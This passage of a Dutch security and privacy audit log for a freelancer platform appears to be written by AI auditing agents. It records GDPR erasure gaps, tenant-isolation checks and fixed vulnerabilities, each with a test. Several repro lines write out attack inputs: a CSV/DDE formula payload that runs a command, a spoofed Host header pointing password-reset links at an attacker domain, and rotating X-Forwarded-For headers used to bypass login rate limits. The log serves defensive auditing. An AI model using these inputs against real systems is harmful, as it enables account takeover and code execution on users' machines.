  de erasure]** `freelancerProfileAnonymizationData()` (`src/lib/account-anonymization.ts`) wiste
  `headline/bio/location/languages/kvkNumber/btwNumber/hourlyRate` maar niet het later toegevoegde
  `defaultMotivation` — de zelf-getypte quick-apply-standaardtekst (≤2000 tekens vrije tekst, kan
  naam/telefoon/adres bevatten; spiegelbeeld van `Application.motivation` die al werd geredact) — noch
  `monthlyIncomeGoalCents` (zelfgekozen financieel doel). Repro: ZZP'er zet `defaultMotivation = "Ik
ben Jan Jansen, 06-…"` → verwijderverzoek → `anonymizeUser` → `User.name/email` + `bio` gewist, maar
  `defaultMotivation` staat verbatim in de DB (en werd door `account-export` als persoonsgegeven
  meegenomen). Gefixt: beide velden nu `null` in `freelancerProfileAnonymizationData()`. Test:
  `src/lib/account-anonymization.test.ts` (twee nieuwe cases, rood→groen).
- **[HOOG→OPGELOST · OWASP A01 · AVG art. 17 + art. 15/20 — `Application.availability` niet geredact
  én niet geëxporteerd]** De erasure-`application.updateMany` (`admin/gebruikers/actions.ts`) overschreef
  alleen `motivation`, niet het vrije-tekst-`availability`-veld (≤200 tekens, bv. "bereikbaar op 06-…,
  kan per direct starten") dat de ZZP'er bij een reactie typte — en `account-export.ts` liet het uit de
  applications-`select` (inzage/portabiliteit-gat). Repro: reactie met `availability = "bereikbaar op
06-12345678"` → erasure → tekst blijft leesbaar op de Application-rij, en de ZZP'er ziet 'm niet eens
  in zijn eigen data-export. Gefixt: `availability: null` toegevoegd aan de freelancer-gescopete
  redactie én `availability: true` aan de export-select. Tests: nieuwe cases in
  `anonymize-erasure.test.ts` (redactie) + `account-export.test.ts` (export), rood→groen.
- **[MIDDEL→OPGELOST · OWASP A01 · CLAUDE.md regel 2 (tenant-isolatie, defense-in-depth) — kandidaat-
  lookup in het shift-overname-governance-scherm zonder eigen tenant-filter]**
  `src/components/shift-overname/governance-screen.tsx` haalde de naam + certificaatstatus (PII,
  gezondheids-adjacent) van de voorgestelde overnemer op met `where: { id: { in: candidateIds } }` —
  zónder tenant-scope, leunend op de invariant die `requestShiftHandoff` bij aanmaak afdwingt
  (`candidate.tenantId == job.tenantId`). Elke andere franchise-query re-asserteert de tenant bij de
  read; deze niet. Repro (zodra de invariant ooit breekt, bv. een admin herparenteert een profiel naar
  een andere tenant): tenant-A-franchiser opent `/franchise/shift-overnames` → ziet de naam +
  certificaten van een tenant-B-ZZP'er in de "Voorgestelde overnemer"-kaart. Gefixt: `...scope`
  (= `tenantScopeWhere(actor)`; `{}` voor admin, `{ tenantId }` voor de franchiser) toegevoegd aan de
  candidate-`where`. Test: nieuwe `governance-screen.test.tsx` (franchiser scoping + admin platform-breed),
  rood→groen.

### Geparkeerd in deze ronde

- **[MIDDEL · AVG art. 5(2)/verantwoordingsplicht · CLAUDE.md regel 5 — vier self-scoped export-routes
  loggen geen audit]** `diensten/export`, `prestaties/export`, `prognose/export` en
  `verplichtingen/export` (`src/app/(protected)/**/export/route.ts`) dwingen auth + rol + rate-limit +
  query-ownership correct af (geen IDOR), maar roepen — anders dan élke sibling-export (`account/export`,
  `administratie/*`, `admin/export/invoices`, `admin/audit/export`) — nooit `audit()` aan bij een export
  van financiële/PII-data. Geen access-control-gat, wel een volledigheidsgat in de auditdekking.
  Aanbevolen fix: `audit({ action: "..._EXPORTED", entityType, entityId: "self", metadata: { count } })`
  spiegelen op `api/administratie/export/route.ts`, ná het genereren van de CSV.
- **[MIDDEL · AVG art. 17 (mogelijk art. 9) — `Performance.description` niet geredact bij erasure; DPO-
  afweging]** De vrije-tekst-omschrijving bij een uren-/mijlpaalindiening (`Performance.description`,
  ≤500 tekens, via `performance-form.tsx`) wordt niet geraakt door `anonymizeUser` en staat niet in
  `account-export`. In een zorgcontext kan die tekst cliënt-/patiëntdetails bevatten. Overlapt de reeds
  geparkeerde fiscale-retentie-afweging voor `Performance.rejectionReason`/`Invoice.rejectionReason` —
  samen oplossen ná menselijke sign-off (rij behouden, alleen het vrije-tekstveld blancen). MENSENWERK §5.
- **[LAAG · verantwoordingsplicht — twee admin-exports zonder auditregel]** `admin/avg/export`
  (statisch verwerkingsregister, geen per-user-PII) en `admin/import/template` (statische CSV-template,
  geen PII) loggen geen audit. Beide `requireRole("ADMIN")`-gated; puur cosmetisch/volledigheid.

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-subagents op niet-overlappende
oppervlakken: (1) franchise/tenant-isolatie & IDOR (incl. de nieuwe `/franchise/opdrachtgevers`- en
`/franchise/zzpers`-aggregaties #707/#709, `tenancy.ts`, shift-overname-governance); (2) alle
`/api/**`-routes + document-/media-/PDF-/dossier-serving, cron-auth, webhook, SSRF, upload; (3)
privacy/AVG — volledigheid van `anonymizeUser`/`account-export`, dataminimalisatie, k-anonimiteit,
audit-logging, PII-in-logs; (4) injectie (SQL/XSS/CSV/ICS/template), mass-assignment/Zod, open
redirect, secrets, CSRF, `npm audit`. Kader: OWASP Top 10 (A01/A03/A07/A09) + ASVS + AVG art.
5/9/17/30/32. **Eén bevinding volledig gefixt (rood→groen, HOOG); drie geparkeerd.** Overige
oppervlakken bevestigd schoon: tenant-isolatie/IDOR (alle franchise-queries `tenantScopeWhere`-gescopet,
geen client-`tenantId`), document/PDF/dossier-serving (owner/tenant-check + audit vóór bytes,
`CSP: sandbox`, `nosniff`), cron-`timingSafeEqual`, webhook-signatuur, SSRF-push-allowlist,
uploads (`validateUpload`+`assertContentMatchesMime`+random key), geen `$queryRawUnsafe`, alle
CSV-exports via `escapeCsvField`/`toCsv`, ICS via `escapeIcsText`, geen `.passthrough()`, geen open
redirect, geen secret in bundle/log, `npm audit` 0 vulnerabilities.

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · OWASP A01/A09 · AVG art. 17 (recht op vergetelheid) — vrije-tekst-PII
  overleefde de erasure in `Notification.body`]** `anonymizeUser`
  (`src/app/(protected)/admin/gebruikers/actions.ts`) redact tientallen bronvelden, maar raakte de
  `Notification`-tabel enkel voor de éne smalle DISPUTE_OPENED-admin-fanout aan. Meerdere
  notificatietypes zetten een **verbatim vrije-tekstreden** in de body die de betrokkene zélf ontving
  (userId == de betrokkene): `NO_SHOW_REPORTED` (de gemelde no-show-reden — mogelijk een
  **gezondheidsgegeven, art. 9**), `PERFORMANCE_REJECTED`, `INVOICE_REJECTED`, `INVOICE_CREDITED`,
  `COLLABORATION_STATUS` (annuleerreden), `CREDENTIAL_REJECTED` (afwijsreden + certificaattitel) en
  `SHIFT_HANDOFF_REJECTED` (beslisnotitie). Die kopie leeft alleen op de `Notification`-rij en werd
  door geen enkele bestaande redactie geraakt — de `user.update` cascadeert niet en berichten/support
  worden apart geredact maar notificaties niet. Repro: ZZP'er met een `NO_SHOW_REPORTED`-notificatie
  waarvan de body `Reden: <medische reden>` bevat → admin voert het verwijderverzoek uit → de reden
  staat na anonimisering nog leesbaar in de notificatie-body. Gefixt: de transactie redact nu
  `Notification.body` voor **álle eigen notificaties** (`where: { userId }`) — na anonimisering is het
  account SUSPENDED met lege `passwordHash` en kan de feed nooit meer worden ingezien, dus de body
  heeft geen operationeel doel meer; robuust voor toekomstige reden-dragende types. De titel blijft
  (generiek, geen PII); de DISPUTE_OPENED-admin-fanout in ándermans feed blijft apart geredact. Test:
  nieuwe case in `src/app/(protected)/admin/gebruikers/anonymize-erasure.test.ts` (rood→groen:
  zonder de `notification.updateMany` blijft de reden in de body staan).
  **Escalatie (MENSENWERK §5):** de `NO_SHOW_REPORTED`-reden kan bijzondere persoonsgegevens (art. 9,
  gezondheid) bevatten — laat een FG vóór go-live de bewaargrond van de bron (`NoShowReport.reason`,
  reeds geparkeerd) beoordelen; het notificatie-lek is nu hoe dan ook gedicht.

### Geparkeerd in deze ronde

- **[HOOG · AVG art. 17/5(1)(f) — document-storage-verwijdering bij erasure is best-effort zonder
  retry/reconciliatie]** `anonymizeUser` verwijdert de `Document`-DB-rijen in de transactie, maar de
  bijbehorende storage-objecten (echte VOG/diploma-bytes) worden dáárna best-effort verwijderd
  (`Promise.all(...).catch(logStorageCleanupFailure)`). Faalt een `storage.delete()` (transient
  S3-fout), dan is de enige sporing een logregel — geen retry-queue, reconciliatie-taak of
  `HealthIncident`. Het gevoeligste PII-bestand kan zo onopgemerkt in de opslag achterblijven.
  Aanbevolen fix: schrijf bij een `storage.delete`-fout een duurzaam remediatie-record (bv.
  `HealthIncident` of een `orphaned-storage-key`-tabel) + een geplande taak die retryt/alarmeert tot
  verwijdering bevestigd is. Repro: mock `storage.delete` → reject → account is DB-geanonimiseerd maar
  het bestand staat er nog; niets buiten een logregel wijst erop.
- **[LAAG-MIDDEL · AVG art. 17 — auteurskant van reden-notificaties (kruis-ontvanger)]** De erasure
  redact nu de eigen ontvangen notificatie-body's (userId == betrokkene). Schreef de betrokkene een
  reden die in de notificatie van de **tegenpartij** belandde (bv. een CLIENT die een
  `PERFORMANCE_REJECTED`-reden schreef → notificatie bij de FREELANCER), dan blijft die kopie staan
  (userId != betrokkene). De reden beschrijft doorgaans de ontvanger (diens werk/afwezigheid), dus de
  sterkste art.17-claim is de ontvangerskant die nu gedicht is; de auteurskant is zwakkere PII zonder
  auteursnaam in de body. Aanbevolen fix: spiegel het DISPUTE_OPENED-patroon (scope via
  collaboration/job/invoice-deep-link) voor de overige reden-types, of accepteer als restrisico met
  FG-sign-off.
- **[MIDDEL · AVG art. 30 — geen verwerkingsregister-/bewaartermijn-entry voor no-show-melding]**
  `src/lib/compliance/processing-register.ts` heeft geen entry voor de no-show-flow (`NoShowReport`,
  `reportNoShow`). Deze verwerking legt vrije tekst van de ene partij over de (vermeende) reden van de
  ander vast — mogelijk gezondheidsgerelateerd — zonder verklaarde grondslag of bewaartermijn, en
  fan-out naar `Notification.body`. Aanbevolen fix: register-entry (grondslag: gerechtvaardigd
  belang/uitvoering overeenkomst) + retentie-regel voor `NoShowReport`/no-show-notificaties, met een
  art.9-vlag naast het reeds geparkeerde `NoShowReport.reason`-erasure-item.

## Ronde 2026-07-10 (basis: `main` @ 14cfb51)

Audit: orchestrator (Opus 4.8) + 1 adversariële Opus-subagent op niet-overlappende oppervlakken.
Kader: OWASP Top 10 (A01/A03/A07) + AVG art. 5/32. **Drie bevindingen volledig gefixt (rood→groen):
één KRITIEK, één HOOG, één MIDDEL** — alle drie via de nieuwe gedeelde `src/lib/public-url.ts`
(vertrouwde publieke origin) + de gedeelde CSV-kern. Fresh sweep bevestigde schoon: mutatieketen
(auth→rol→ownership→Zod→actie→audit) over samenwerkingen/facturen/uitgaven/profiel/berichten/
reacties/rooster/beschikbaarheid/kandidaten; franchise/tenant-isolatie + `tenancy.ts`; overige
CSV-exports (allen via `escapeCsvField`/`toCsv`); geen `.passthrough()`/mass-assignment; geen
`$queryRawUnsafe`; geen `dangerouslySetInnerHTML` met user-input; admin/franchise-RBAC defense-in-depth.

### OPGELOST in deze ronde

- **[KRITIEK→OPGELOST · OWASP A01/A07 · CWE-640 (host-header/reset-poisoning → account-overname)]**
  `requestPasswordReset` (`src/app/wachtwoord-vergeten/actions.ts`) bouwde de wachtwoord-reset-URL
  uit de client-beïnvloedbare `x-forwarded-host`/`host`-header. Een aanvaller kon een reset aanvragen
  voor een slachtoffer met `Host: attacker.example`; de (legitieme) reset-mail wees dan een GELDIG
  token naar het aanvallerdomein → overname bij één klik. De middleware gebruikte al `AUTH_URL`, maar
  deze action niet. Repro: `POST` reset-form met `X-Forwarded-Host: attacker.example` → mail bevatte
  `https://attacker.example/wachtwoord-herstellen/<token>`. Gefixt: nieuwe gedeelde
  `src/lib/public-url.ts` (`resolvePublicOrigin`/`publicOrigin`) resolvet de origin uit
  `AUTH_URL`/`NEXTAUTH_URL` en negeert de headers zodra die geconfigureerd is (spiegelt
  `getPublicOrigin` in de middleware). Test: `src/app/wachtwoord-vergeten/reset-poisoning.test.ts`
  (rood→groen: vervalste host + AUTH_URL → link gebruikt AUTH_URL, bevat het aanvallerdomein niet) +
  `src/lib/public-url.test.ts`. **Escalatie (MENSENWERK §5):** zet `AUTH_URL` in productie (staat al
  als niet-fatale env-waarschuwing) — zonder die waarde valt de resolver in dev terug op headers.
- **[HOOG→OPGELOST · OWASP A03 · CWE-1236 (CSV-formule-injectie in de Prestaties-export)]**
  `exportPrestatiesCsv` (`src/lib/prestaties.ts`) was de enige export die de quoting handmatig deed
  (`"${v.replace(/"/g,'""')}"`) i.p.v. de gedeelde `escapeCsvField`/`toCsv` — en miste dus de
  formule-injectie-guard. Vrije tekst van de ZZP'er (`freelancerName`, `description`,
  `rejectionReason`) belandt in de spreadsheet van de opdrachtgever; een cel die met `= + - @`
  begint werd als formule uitgevoerd (DDE/exfiltratie). Repro: ZZP'er zet omschrijving
  `=cmd|'/c calc'!A1` → opdrachtgever exporteert `/prestaties` → formule voert uit in Excel. Gefixt:
  export gaat nu via `toCsv` uit `@/lib/csv` (voorloopse apostrof-guard). Test: nieuwe case in
  `src/lib/prestaties.test.ts` (rood→groen).
- **[MIDDEL→OPGELOST · OWASP A01 (open redirect via request-origin in de betaal-checkout)]**
  `changeSubscription` (`src/app/(protected)/abonnement/actions.ts`) bouwde de payment-provider
  `returnUrl`/`webhookUrl` uit de request-`Origin`/`Host`. Na een betaling kon de browser naar een
  aanvallerdomein worden geredirect. Gefixt: `returnUrl`/`webhookUrl` uit `publicOrigin()`
  (`AUTH_URL`), nooit uit request-headers. Bijvangst: `admin/import/actions.ts` (`loginUrl` in de
  bulk-welkomstmail) gebruikte dezelfde spoofbare header en is mee-gemigreerd naar `publicOrigin()`.
  (Deze bevinding stond geparkeerd in ronde 2026-07-09 en is nu opgelost.)

## Ronde 2026-07-09 (2e — basis: `main` @ 76a8ca9)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-subagents op niet-overlappende
oppervlakken: (1) franchise/tenant-isolatie & IDOR (leads, zzpers, opdrachtgevers, diensten,
instellingen, `tenancy.ts`, `admin/franchises`, incl. de nieuwe reacties-lijst #694); (2) API-route-
authz, upload/storage, SSRF, injectie over alle `/api/**` + document-/media-/PDF-/dossier-serving +
uitgaande `fetch`; (3) privacy/AVG — volledigheid van `anonymizeUser`/`account-export`,
verwerkingsregister, k-anonimiteit, PII-in-logs. Kader: OWASP Top 10 (A01/A03/A04/A07/A09) + ASVS +
AVG art. 5/17/30/32. **Drie bevindingen volledig gefixt (rood→groen): één KRITIEK, één HOOG, één
MIDDEL.** Overige oppervlakken bevestigd schoon (document/media/PDF/dossier IDOR+audit, cron-auth
`timingSafeEqual`, path-traversal-guard, SSRF-allowlist voor push, geen `$queryRawUnsafe`, geen
stacktrace-lek, admin-RBAC defense-in-depth).

### OPGELOST in deze ronde

- **[KRITIEK→OPGELOST · OWASP A07 (auth failures) / rate-limit-bypass — vervalsbaar
  `X-Forwarded-For` omzeilde élke IP-gebonden rate limiter, incl. login-brute-force]**
  `requestMeta()` (`src/lib/request-meta.ts`) en drie gedupliceerde `clientIp()`-kopieën
  (`api/csp-report`, `api/client-error`, `api/billing/webhook`) namen de **LINKER** (eerste)
  `X-Forwarded-For`-entry — precies de waarde die de client zélf kan zetten. Een aanvaller stuurde
  per request een ander eerste XFF-IP en gaf zich zo telkens voor een nieuw IP uit → onbeperkte
  wachtwoord-guessing tegen een bekend account (`loginRateLimiter` keyt op `${ip}:${email}`,
  `src/auth.ts`) plus log-/CPU-flood op de ongeauthenticeerde endpoints. Repro: `POST /api/csp-report`
  met wisselende `X-Forwarded-For: 1.2.3.<n>` → nooit 429. Gefixt: nieuwe pure helper
  `src/lib/client-ip.ts` (`clientIpFrom`/`clientIpFromRequest`) neemt de door de vertrouwde proxy
  toegevoegde **rechter** entry (`TRUSTED_PROXY_HOP_COUNT` hops vanaf rechts, default 1 voor Railway),
  nooit de client-linkerkant; alle vier de call-sites gecentraliseerd. Test:
  `src/lib/client-ip.test.ts` + de drie route-tests aangepast (rood→groen: leftmost-spoof verandert
  het gekozen IP niet meer). **Escalatie (MENSENWERK §5):** de exacte hop-count hangt van de Railway-
  edge af (append vs. overwrite); default 1 is correct voor één vertrouwde proxy en strikt veiliger
  dan leftmost, maar bevestig de edge-config vóór go-live en stel zo nodig `TRUSTED_PROXY_HOP_COUNT` in.
- **[HOOG→OPGELOST · AVG art. 17 (recht op wissen) — dispuutreden overleefde de anonimisering in de
  event-store]** De vrije-tekst-dispuutreden staat in twee kopieën: `Collaboration.disputeReason`
  (werd al gewist) én de `payload` van het `DISPUTE_OPENED`-domeinevent
  (`{ reason }`, `src/lib/cascade/dispute-commands.ts:48`). `anonymizeUser` LAS de events al (om
  `ownDisputeCollabIds` te bepalen) maar scrubde de payload zelf nooit → de reden (mogelijk medische/
  persoonlijke details) bleef ná een verwijderverzoek onbeperkt en herleidbaar (`actorId` = de niet-
  verwijderde `userId`) in `DomainEvent` staan. Repro: FREELANCER opent dispuut met vrije tekst →
  vraagt art. 17-verwijdering → vóór de fix bleef de tekst in `domainEvent.payload`. Gefixt:
  `prisma.domainEvent.updateMany({ where: { type: "DISPUTE_OPENED", actorId: userId }, data: { payload: "{}" } })`
  toegevoegd aan de anonimiseringstransactie (spiegelt `DISPUTE_RESOLVED`, dat al `"{}"` schrijft).
  Test: nieuwe case in `anonymize-erasure.test.ts` (updateMany aanwezig, where-scope + lege payload).
- **[MIDDEL→OPGELOST · OWASP A01 / CWE-203 (observable discrepancy) — cross-tenant existence-oracle
  in de onboarding-wizard]** `addAfdelingStep`/`removeAfdelingStep`
  (`franchise/opdrachtgevers/nieuw/actions.ts`) laadden met kaal `findUnique` en riepen dáárna
  `assertSameTenant` aan: een cross-tenant id gaf een **andere** melding ("Geen toegang tot deze
  bemiddeling-resource.") dan een onbekend id ("Opdrachtgever niet gevonden."), en `removeAfdelingStep`
  gooide zelfs een **ongevangen** `AuthorizationError` (crash) i.p.v. de stille no-op die het
  zusterbestand `../actions.ts` gebruikt. Een FRANCHISER kon zo bestaan/eigendom van een id onder een
  ándere franchise afleiden. Gefixt: `if (!entity || !ownsViaTenant(actor, entity.tenantId)) …` met
  identieke melding/no-op voor beide gevallen (spiegelt `addDepartment`/`removeDepartment`). Test:
  `nieuw/wizard-oracle.test.ts` (cross-tenant ≡ onbekend id; geen thrown 403).

### GEPARKEERD (repro + severity + geschonden regel + aanbevolen fix)

- **[MIDDEL · AVG art. 17 — `AuditLog.metadata.reason` (vrije tekst) niet gescrubd bij erasure]**
  `scrubAuditMetadataPii` (`src/lib/account-anonymization.ts:52-58`) redact alleen velden die **exact**
  gelijk zijn aan het e-mailadres/de naam; een vrije-tekst-`reason` (DISPUTE_OPENED, PERFORMANCE_REJECTED,
  INVOICE_REJECTED/CREDITED — `src/lib/cascade/handlers.ts`, `dispute-commands.ts:78`) matcht nooit en
  blijft staan op auditregels die aantoonbaar over de betrokkene gaan (`owned`). Fix: blank de bekende
  vrije-tekstsleutel `reason` op owned-rijen (analoog aan de outright-null van `disputeReason`).
- **[MIDDEL · AVG art. 15/17 — `Performance.rejectionReason` / `Invoice.rejectionReason` (eigen tekst)
  niet gewist noch geëxporteerd]** De afkeur-/creditreden die de betrokkene als CLIENT/FREELANCER zelf
  schreef (`src/lib/cascade/handlers.ts:217,372,506`) komt niet voor in `anonymizeUser` of
  `account-export`. Fix: `updateMany` gescopet op de eigen partij (spiegel `Application.note` via
  `collaboration.company.userId`), en velden toevoegen aan `buildAccountExport`.
- **[MIDDEL · OWASP A01 / open redirect — `abonnement/actions.ts` ...] → OPGELOST in ronde 2026-07-10**
  (via de gedeelde `src/lib/public-url.ts`; zie de OPGELOST-sectie bovenaan).
- **[LAAG · CWE-203 — zelfde existence-oracle-melding in `admin/shift-overnames/actions.ts:35`
  (`loadDecidableHandoff`)]** Door FRANCHISER bereikbaar via de gedeelde shift-overname-forms; wél
  gevangen (geen crash), alleen melding-onderscheidbaar. Fix: unificeer de melding met "niet gevonden".

## Ronde 2026-07-09 (basis: `main` @ b204e89)

Audit: orchestrator (Opus 4.8) + 1 parallelle adversariële Opus security-subagent, gericht op de vérse
delta sinds de vorige ronde (`fd8826e..b204e89`, #681–#687 — cross-tenant existence-oracle-fix,
ADMIN-systeemstatus-scherm, wettelijke-factuureisen-check, "samenwerking loopt af"-nudge, **werkervaring
op het ZZP-profiel** #683, +20 ontwerpconcepten). Kader: OWASP Top 10 (A01/A03/A04/A09) + ASVS + AVG
art. 5/15/17/30. Zelf onafhankelijk geverifieerd schoon (subagent + grep): `invoice-legal.ts`/
`invoice-compliance-card.tsx` (pure/presentationeel, btw/kvk van de ZZP'er nooit naar de opdrachtgever-
payload — `compliance` is `isFreelancerOwner ? … : null`), `collaboration-renewal.ts`/`renewal-nudge.tsx`
(participant-gated), **`system-status.ts`/`system-status-panel.tsx`** (ADMIN-only via `requireRole` +
middleware; leest uitsluitend driver-MODI/booleans — géén sleutelwaarden bereiken de client; de rauwe
`Env` passeert de server/client-grens nooit, alleen de secret-vrije `SystemStatus`-struct), de 20 nieuwe
`/ontwerp`-concepten (statisch, geen `dangerouslySetInnerHTML`/Prisma/`fetch`; grep: 0 BSN-achtige
9-cijferreeksen, 0 e-mailadressen in de mock-data). **Eén HOOG volledig gefixt (rood→groen); geen overige
nieuwe gaten.**

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · AVG art. 17 (recht op wissen) + CLAUDE.md verificatieflow — de nieuwe
  `WorkExperience`-PII (#683) overleefde de anonimisering]** De werkervaring-feature introduceerde
  `model WorkExperience` (`prisma/schema.prisma:382`) met **zelf-gerapporteerde vrije tekst** die de
  ZZP'er op zijn (publieke) `/zzp/[id]`-profiel toont: `role` ("Verpleegkundige IC"), `organization`
  (opdrachtgever/instelling) en `description` (vrije toelichting die namen/patiënt-/opdrachtdetails kan
  bevatten). `anonymizeUser` (`src/app/(protected)/admin/gebruikers/actions.ts`) **updatet** het
  `FreelancerProfile` (visibility→PRIVATE) i.p.v. het te verwijderen, dus de `onDelete:Cascade` op
  `WorkExperience.freelancerProfileId` **vuurt niet** — precies het scenario dat de transactie voor élk
  zustergeval (`AvailabilityWindow.note`, `IndirectHoursEntry.note`, `FavoriteFreelancer.note`,
  `LeadContact.body`, `Idea`) expliciet met een eigen `updateMany`/`deleteMany` afvangt. Voor
  `WorkExperience` ontbrak die stap → de rol/organisatie/omschrijving bleven ná een verwijderverzoek
  onbeperkt in de DB staan (en, tot visibility PRIVATE werd, publiek zichtbaar). Repro: FREELANCER voegt
  een werkervaring toe → vraagt (art. 17) verwijdering → vóór de fix bleef `WorkExperience` met alle
  vrije tekst bestaan (herleidbaar uit "Verpleegkundige IC bij [kleine instelling] 2019–2020" +
  omschrijving). Gefixt: `prisma.workExperience.deleteMany({ where: { freelancerProfile: { userId } } })`
  toegevoegd aan de anonimiseringstransactie — de hele rij is PII van de betrokkene zónder operationele/
  fiscale bewaargrond (anders dan `Invoice`/`Expense`), dus volledig wissen (spiegelt `credential`/
  `document.deleteMany`), gescopet op het eigen profiel (nooit dat van een ander). Test: nieuwe case in
  `anonymize-erasure.test.ts` (deleteMany aanwezig + `where: { freelancerProfile: { userId } }` —
  rood→groen bewezen: zonder de regel ontbreekt de op; export/`account-export.ts` bevatte de velden al
  sinds #683, dus art. 15/20 was reeds gedekt).

## Ronde 2026-07-08 (2e — basis: `main` @ fd8826e)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-subagents op niet-overlappende
oppervlakken: (1) tenant-isolatie & IDOR over het volledige franchise-oppervlak (leads, zzpers,
opdrachtgevers, diensten, instellingen), `kandidaten`, `admin/franchises`, `samenwerkingen` +
`src/lib/tenancy.ts`; (2) API-route-authz, upload/storage, SSRF, injectie over alle `/api/tasks/**`
(cron-auth), document-/media-/PDF-/dossier-serving, `agenda/feed.ics`, `storage.ts`; (3) privacy/AVG —
volledigheid van `anonymizeUser`, `account-export.ts`, verwerkingsregister, k-anonimiteit, PII-in-logs.
Kader: OWASP Top 10 (A01/A03/A04/A09) + ASVS + AVG art. 5/15/17/30/32. **Geen KRITIEK/HOOG/MIDDEL
nieuwe security-gaten** — de mutatieketen (auth→rol→ownership→Zod→actie→audit), cron-auth
(`timingSafeEqual` op `CRON_SECRET`), document-serving (ownership + audit op allow én deny),
`assertSameTenant` (fail-closed), path-traversal-guard in `storage.ts` en de feed-token-HMAC zijn
consistent en solide. **Twee gerichte hardening-fixes volledig gedaan (rood→groen); MENSENWERK-items
(erasure van vrije-tekst-`reason` in event-store/notificaties, reviewer-naam in register) herbevestigd
en geparkeerd voor DPO-sign-off.**

### OPGELOST in deze ronde

- **[MIDDEL→OPGELOST · AVG art. 5/25 (privacy by design), k-anonimiteit — regressietest van de
  markttarief-drempel was losgekoppeld van de productieconstante]** De k-anonimiteitsvloer op
  markttarief-aggregaties (`MARKET_RATE_MIN_SAMPLE = 10`, `src/lib/config.ts:209`) voorkomt dat een
  ZZP'er het uurtarief (persoonlijke financiële data) van één collega herleidt uit p25/mediaan/p75. De
  productie-wiring (`src/lib/data/job-rate-bands.ts:55,62`) gebruikt de constante correct server-side,
  maar de enige test (`src/lib/market-rate.test.ts`) draaide met een lokale `MIN = 3` om louter de
  scope-keuze-logica te toetsen — géén test bond zich aan de échte constante. Repro: verlaag
  `MARKET_RATE_MIN_SAMPLE` naar 3 → de band toont bij 3 peers → herleidbaar, en **geen enkele test werd
  rood**. Gefixt: nieuwe `describe("k-anonimiteitsvloer MARKET_RATE_MIN_SAMPLE")` importeert de échte
  constante en assert `>= 10`. Rood→groen: elke verlaging onder 10 maakt de test nu rood.

- **[LAAG→OPGELOST · OWASP A01 (broken access control) — cross-tenant existence-oracle in franchise
  void-acties]** `setLeadStatus`/`deleteLead`/`addLeadContact` (`franchise/leads/actions.ts`) en
  `addDepartment`/`removeDepartment` (`franchise/opdrachtgevers/actions.ts`) laadden met kaal
  `findUnique({where:{id}})` en riepen dáárna `assertSameTenant` aan. Een onbekend id gaf een stille
  no-op; een **bestaand id van een ándere tenant** gooide een ongevangen `AuthorizationError` → een
  cross-tenant existence-oracle (een franchiser kon met een gegokt id onderscheiden of een
  lead/afdeling van een andere bemiddeling bestáát) + een lelijke 403/500 naar de client. Repro: een
  FRANCHISER van tenant-A roept `deleteLead("<id-van-tenant-B>")` → vóór de fix een thrown 403 (bestaat)
  vs. stille redirect (bestaat niet). Gefixt: throwende `assertSameTenant` vervangen door het bestaande
  fail-closed predicaat `ownsViaTenant` → cross-tenant gedraagt zich nu IDENTIEK aan "niet gevonden"
  (stille no-op/redirect, geen thrown status, geen oracle). Tests: `delete-lead.test.ts` bijgewerkt —
  cross-tenant asserteert nu de stille redirect i.p.v. de thrown fout (rood→groen: het oude
  `assertSameTenant`-pad gooide en faalde de nieuwe assertie).

## Ronde 2026-07-08 (basis: `main` @ 12e30fc)

Audit: orchestrator (Opus 4.8) + 2 parallelle adversariële Opus-subagents op niet-overlappende
oppervlakken: (1) de vérse delta sinds de vorige ronde (`ab6bc99..12e30fc`, #666–#672 — fail-closed
mock-verificatiepoort, client-fout-rapportage `/api/client-error`, inkomstendoel, uitgaven-tracker,
constructieve afwijzingsreden) — volledige auth→rol→ownership→Zod→actie→audit-keten + IDOR/injectie/
SSRF/PII-in-logs; (2) herverificatie van de geparkeerde privacy-items + een privacy-sweep op de nieuwe
`Expense`-data. Kader: OWASP Top 10 (A01/A03/A04/A09) + ASVS + AVG art. 5/15/17/20/30. **Delta-audit:
geen nieuwe security-gaten** — de uitgaven-/inkomstendoel-/kandidaten-acties volgen de keten volledig,
`/api/client-error` is PII-arm genormaliseerd + rate-limited, `rejection-reason` is een gesloten enum
(geen vrije tekst naar de ZZP'er), `route-guards` matcht op segmentgrens. **Eén HOOG + één MIDDEL
volledig gefixt (rood→groen); rest herbevestigd/geparkeerd.**

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · AVG art. 17 (recht op wissen) + art. 30/5/6 — prospect-PII in `Lead`/`LeadContact`
  had geen wis-pad, geen register-entry, geen bewaartermijn]** `model Lead` (`prisma/schema.prisma`)
  bewaart `contactName`/`email`/`phone`/`notes` van een externe opdrachtgever-prospect (géén platform-
  `User`) plus een vrije-tekst-`LeadContact.body`-logboek. `src/app/(protected)/franchise/leads/actions.ts`
  kende **alleen** create/statuswijziging/contact — **geen delete**. `anonymizeUser` raakt uitsluitend
  `User`-gebonden data, dus er bestond letterlijk geen enkel pad om deze PII te wissen → indefinite
  retentie, geen grondslag/termijn vastgelegd. Repro: een FRANCHISER legt een lead met naam+e-mail+
  telefoon+notities vast; de prospect vraagt (art. 17) om verwijdering → vóór de fix kon niemand dat
  uitvoeren, de PII bleef eeuwig staan. Gefixt: nieuwe `deleteLead(leadId)`-server-action (auth → rol
  FRANCHISER → `assertSameTenant` (tenant-ownership) → `prisma.lead.delete` — `LeadContact` cascadet mee
  via `onDelete: Cascade` op `leadId` → `LEAD_DELETED`-audit → redirect naar de lijst); UI-wisknop met
  bevestiging (`[id]/delete-lead-control.tsx`) op de lead-detailpagina; register-entry "Lead-acquisitie
  (bemiddelaar)" (grondslag GERECHTVAARDIGD_BELANG, expliciete bewaartermijn + wis-pad) +
  `RETENTION_SCHEDULE`-regel "Acquisitie-leads". Tenant-gescopet: een franchiser wist nooit een lead van
  een andere bemiddeling. Tests: `src/app/(protected)/franchise/leads/delete-lead.test.ts` (4 cases —
  eigen-tenant → delete+audit+redirect; cross-tenant → `AuthorizationError`, géén delete/audit;
  niet-FRANCHISER → geweigerd; onbekend id → geen delete, wél redirect (geen bestaan-lek) — rood→groen:
  zonder de tenant-poort zou de delete cross-tenant vuren).

- **[MIDDEL→OPGELOST · AVG art. 15/20 (inzage/dataportabiliteit) — de nieuwe `Expense`-PII ontbrak
  volledig in de inzage-export]** De uitgaven-tracker (#670) introduceerde `model Expense`
